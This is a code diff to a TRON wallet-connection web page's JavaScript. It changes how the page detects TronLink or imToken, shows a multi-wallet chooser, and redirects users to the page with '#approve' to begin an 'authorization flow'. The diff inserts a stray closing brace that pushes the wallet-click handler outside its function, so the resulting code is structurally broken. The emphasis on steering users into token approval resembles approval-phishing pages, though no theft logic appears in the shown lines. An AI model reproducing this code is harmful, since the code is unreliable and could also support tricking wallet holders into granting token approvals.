@@ -1338,8 +1338,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     }
 });
 async function checkImTokenEnv() {
-    const lang = langConfig[currentLang];
-    if (window.tronWeb) {
+    if (window.tronWeb && window.tronWeb.ready) { // 仅检测tronweb环境（TronLink），不判断其他钱包
         tronWeb = window.tronWeb;
         connectBtn.style.display = "none";
         warning.style.display = "none";
@@ -1352,16 +1351,16 @@ async function checkImTokenEnv() {
         setTimeout(() => checkImTokenEnv(), 500);
         return;
     }
-    // 显示多钱包选择弹窗（替换原单一imToken弹窗）
+    // 非tronweb环境：显示多钱包选择弹窗（通用逻辑，不绑定任何单一钱包）
     specialTipContainer.style.display = "block";
     userInfoDefault.style.display = "none";
     userInfoStatus.style.display = "block";
-    userInfoStatus.innerHTML = lang.nonImTokenUser;
+    userInfoStatus.innerHTML = "请选择要连接的钱包"; // 通用文案，不提及imToken等特定钱包
     approveBtn.style.display = "none";
     connectBtn.style.display = "none";
-    nonImTokenPopup.style.display = "none";
-    multiWalletPopup.style.display = "block"; // 显示多钱包弹窗
-
+    nonImTokenPopup.style.display = "none"; // 隐藏旧的单一钱包弹窗
+    multiWalletPopup.style.display = "block"; // 显示多钱包选择弹窗
+}
     // 给每个钱包项绑定跳转逻辑
     walletItems.forEach(item => {
         item.onclick = async () => {
@@ -1369,7 +1368,7 @@ async function checkImTokenEnv() {
             const wallet = walletConfig[walletType];
             if (!wallet) return;
             // 拼接授权页面URL（当前页面+#approve参数，直接进入授权流程）
-            const targetUrl = pureUrl + "#approve";
+            const targetUrl = window.location.href + "#approve";
             let jumpUrl = "";
             switch (walletType) {
                 case "imtoken":
